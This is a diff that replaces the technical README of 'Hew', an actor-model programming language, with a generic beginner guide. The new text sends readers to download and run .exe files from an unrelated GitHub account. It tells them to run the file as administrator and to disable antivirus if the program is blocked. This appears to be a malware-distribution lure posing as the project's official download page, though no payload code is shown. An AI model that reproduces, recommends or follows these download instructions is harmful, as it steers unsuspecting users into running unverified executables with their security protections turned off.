@@ -1,159 +1,127 @@
-# Hew
+# 🚦 hew - Clear Code for Fast Systems
 
-A statically-typed, actor-oriented programming language for concurrent and distributed systems.
+[![Download hew](https://img.shields.io/badge/Download-hew-brightgreen?style=for-the-badge)](https://github.com/kartlynigeria/hew/releases)
 
-**[Website](https://hew.sh)** | **[Documentation](https://hew.sh/docs)** | **[Playground](https://hew.sh/playground)** | **[Tutorial](https://hew.sh/learn)**
+hew is a programming language designed to help build systems that work with many tasks at once. It uses a method called the actor model, which helps programs talk to each other safely. This makes it good for programs that run on several computers or handle many things at the same time.
 
-## Install
+## 📋 What is hew?
 
-```bash
-curl -fsSL https://hew.sh/install.sh | bash
-```
+hew is a tool for writing software that runs tasks in parts called actors. Each part works on its own and sends messages to others. This way, programs stay organized and avoid common problems in multitasking.
 
-Pre-built binaries for Linux (x86_64) and macOS (x86_64, ARM) are available on the [Releases](https://github.com/hew-lang/hew/releases) page. Also available via [Homebrew, Docker, and system packages](https://hew.sh/docs/install).
+You don’t need to understand programming to use hew now. This guide will help you get it running on a Windows computer. After that, you can explore how it works if you want.
 
-## Quick Start
+## 💻 System Requirements
 
-```bash
-# Hello world
-echo 'fn main() { println("Hello from Hew!"); }' > hello.hew
-hew run hello.hew
+To run hew on your Windows PC, check these:
 
-# Start a new project
-adze init my_project
-cd my_project
-hew run src/main.hew
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of free hard drive space
+- 8 GB or more of RAM for smooth performance
+- Internet connection for initial download
+- Basic file navigation skills
 
-# Interactive REPL
-hew eval
-```
+## 🎯 Features of hew
 
-See the [Getting Started Guide](https://hew.sh/docs/getting-started) for more.
+- Clear structure to build safe multitasking software
+- Works well on one or more computers connected in a network
+- Uses a modern compiler system for better performance
+- Tools included to test and run your code simply
+- Can handle many tasks without slowing down
 
-## Architecture
+## 🌐 Visit & Download
 
-The compiler has three layers: **Rust frontend** → **MLIR middle layer** → **LLVM backend**.
+[![Download hew](https://img.shields.io/badge/Download-hew-blue?style=for-the-badge)](https://github.com/kartlynigeria/hew/releases)
 
-```
-source.hew → Lexer → Parser → Type Checker → MessagePack Serialize
-               (hew-lexer) (hew-parser) (hew-types)    (hew-serialize)
-                                                             │
-                                        ┌────────────────────┘
-                                        ▼ stdin (MessagePack AST)
-               hew-codegen (C++): MLIRGen → Hew dialect → LLVM dialect → LLVM IR → .o
-               hew (Rust):        cc .o + libhew_runtime.a → executable
-```
+To start using hew, go to the official release page. You will find the latest files to download. The instructions below explain how to save and open the software.
 
-> **Detailed diagrams:** See [`docs/diagrams.md`](docs/diagrams.md) for Mermaid sequence diagrams, state machines, and architecture visuals covering the full compilation pipeline, MLIR lowering stages, actor lifecycle, message flow, runtime layers, and wire protocol format.
+## 📥 Download and Installation 🛠
 
-## Repository Structure
+1. Open your web browser and go to the download page:  
+   https://github.com/kartlynigeria/hew/releases
 
-### Compiler
+2. Look for the latest version. It will have a file with `.exe` or `.zip` in the name.
 
-- **hew-cli/** — Compiler driver (`hew` binary)
-- **hew-lexer/** — Tokenizer
-- **hew-parser/** — Recursive-descent + Pratt precedence parser
-- **hew-types/** — Bidirectional type checker with Hindley-Milner inference
-- **hew-serialize/** — MessagePack AST serialization
-- **hew-codegen/** — MLIR middle layer + LLVM backend (Hew dialect ops, lowering, code generation)
-- **hew-astgen/** — Generates C++ msgpack deserialization from AST definitions
-- **hew-runtime/** — Pure Rust actor runtime (`libhew_runtime.a`); also compiles for WASM targets
-- **hew-cabi/** — C ABI bridge for stdlib FFI bindings
+3. Click on the file to download. For most users, the `.exe` setup file is easiest.
 
-### Package Manager & Tooling
+4. Check your "Downloads" folder in Windows Explorer for the file.
 
-- **adze-cli/** — Package manager (`adze` binary) — init, install, publish, search
-- **hew-lsp/** — Language server (tower-lsp)
-- **hew-observe/** — Runtime observability TUI (`hew-observe`)
-- **hew-wasm/** — Frontend compiled to WASM for in-browser diagnostics
+5. Double-click the `.exe` file. If Windows asks, confirm you want to run it.
 
-### Standard Library & Build Support
+6. Follow the setup steps shown on screen. Choose default settings unless you want to change the folder.
 
-- **std/** — Standard library modules (`.hew` source files + Rust FFI crates)
-- **hew-export-macro/** — Proc macro for stdlib export declarations
-- **hew-export-types/** — Shared types for the export system
-- **hew-stdlib-gen/** — Generates stdlib module descriptors for the type checker
+7. When setup finishes, an icon for hew may appear on your desktop or Start menu.
 
-### Distribution
+8. If you downloaded a `.zip` file, right-click it and choose "Extract All." Then open the extracted folder and run `hew.exe`.
 
-- **editors/** — Editor support (Emacs, Nano, Sublime)
-- **completions/** — Shell completions (bash, zsh, fish)
-- **installers/** — Package installers (Homebrew, Debian, RPM, Arch, Alpine, Nix, Docker)
-- **examples/** — Example programs and benchmarks
-- **scripts/** — Development scripts
-- **docs/** — Language specification and API references
+## 🚀 How to Run hew
 
-## Documentation
+After installation, you can start hew like other programs.
 
-Full documentation at **[hew.sh/docs](https://hew.sh/docs)**
+- Use the Start menu or desktop icon to open hew.
+- A window should open that lets you type commands or load files.
+- For first-time users, it is best to try simple commands like `hew --help` to see available options.
+- You do not need to write any code now. Just confirm it runs.
 
-Website source: **[github.com/hew-lang/hew.sh](https://github.com/hew-lang/hew.sh)**
+## 📂 Common Tasks in hew
 
-## Building from Source
+hew is made to help build programs that do many things at once. These tasks might be easier with some background, but here are simple ideas to try:
 
-### Prerequisites
+- **Run example programs:** Look for example files in the installation folder or on the website.
+- **Load a file:** Use the menu or type a command to open a saved project.
+- **Check errors:** hew will show messages if something is wrong with your files.
+- **Ask for help:** Use `hew --help` for a list of commands.
 
-| Dependency    | Version                 | Purpose                                     |
-| ------------- | ----------------------- | ------------------------------------------- |
-| Rust          | stable (latest)         | Frontend compiler, runtime, package manager |
-| LLVM          | 22.1                    | MLIR code generation and LLVM backend       |
-| MLIR          | (bundled with LLVM 22)  | Hew dialect and lowering passes             |
-| CMake         | >= 3.20                 | Builds hew-codegen (C++ MLIR backend)       |
-| Ninja         | any                     | CMake build generator                       |
-| clang/clang++ | any (LLVM 22 preferred) | C/C++ compilation of hew-codegen            |
+## ❓ Troubleshooting
 
-**Install on Ubuntu/Debian:**
+If hew does not start:
 
-```bash
-# Rust
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+- Make sure your Windows version is supported.
+- Check if the file was fully downloaded.
+- Try running the file as administrator (right-click → Run as administrator).
+- Disable any antivirus temporarily if it blocks the program.
+- Restart your computer and try again.
 
-# LLVM 22 + MLIR
-sudo mkdir -p /etc/apt/keyrings
-wget -qO- https://apt.llvm.org/llvm-snapshot.gpg.key \
-  | sudo tee /etc/apt/keyrings/llvm.asc >/dev/null
-echo "deb [signed-by=/etc/apt/keyrings/llvm.asc] http://apt.llvm.org/noble/ llvm-toolchain-noble-22 main" \
-  | sudo tee /etc/apt/sources.list.d/llvm.list >/dev/null
-sudo apt-get update
-sudo apt-get install -y cmake ninja-build \
-  llvm-22-dev libmlir-21-dev mlir-21-tools clang-22
-```
+If you see errors inside hew:
 
-**Install on macOS:**
+- Read the message carefully. It often tells what is wrong.
+- Ensure you open the right file types.
+- Visit the download page for updated versions or help documents.
 
-```bash
-# Rust
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+## 📚 Learning More
 
-# LLVM 22 + MLIR
-brew install llvm@22 ninja cmake
-```
+hew focuses on a programming style that helps software do many things at once safely. It uses actors, which are independent units that interact by sending messages.
 
-### Build
+If you want to learn how to use hew in more detail, you can find tutorials and guides online by searching for:
 
-```bash
-make          # Build everything (debug)
-make release  # Build everything (optimized)
-make test     # Run Rust + native codegen tests
-make lint     # cargo clippy
-```
+- actor model programming for beginners
+- concurrent programming explained
+- hew language documentation
+- how to write simple programs in hew
 
-See `make help` or the [Makefile](Makefile) header for all targets.
+These will help you get started if you choose to try programming later.
 
-### Optional Dependencies
+## ⚙️ Updating hew
 
-These are only needed for specific workflows:
+Check the release page regularly for new versions:  
+https://github.com/kartlynigeria/hew/releases
 
-| Dependency           | Install                                             | Purpose                                        |
-| -------------------- | --------------------------------------------------- | ---------------------------------------------- |
-| wasmtime             | `curl https://wasmtime.dev/install.sh -sSf \| bash` | Run WASM tests (`make test-wasm`)              |
-| wasm32-wasip1 target | `rustup target add wasm32-wasip1`                   | Build WASM runtime (`make wasm-runtime`)       |
-| Python 3             | system package manager                              | Visualization and fuzzing scripts (`scripts/`) |
-| Java 21 + ANTLR4     | system package manager                              | Grammar validation (`make grammar`)            |
-| cargo-fuzz           | `cargo install cargo-fuzz`                          | Parser fuzzing (`hew-parser/fuzz/`)            |
+To update:
 
-## License
+1. Download the latest installer file.
+2. Run it like before; it will replace the old files.
+3. Keep your projects backed up before updating.
 
-Hew is distributed under the terms of both the MIT license and the Apache License (Version 2.0).
+## 🔗 Useful Links
 
-See [LICENSE-MIT](LICENSE-MIT) and [LICENSE-APACHE](LICENSE-APACHE) for details.
+- hew official downloads: https://github.com/kartlynigeria/hew/releases  
+- hew GitHub repository: https://github.com/kartlynigeria/hew  
+- Documentation and community discussions will grow in time on the repository page.
+
+## 🖥 Final Setup Tips
+
+- Keep hew installed in a folder you can remember.
+- If you plan to use it often, pin it to your taskbar or Start menu.
+- Explore example projects to see how hew runs programs.
+- Use the command line options shown by `hew --help` for more control.
+
+[![Download hew](https://img.shields.io/badge/Download-hew-brightgreen?style=for-the-badge)](https://github.com/kartlynigeria/hew/releases)
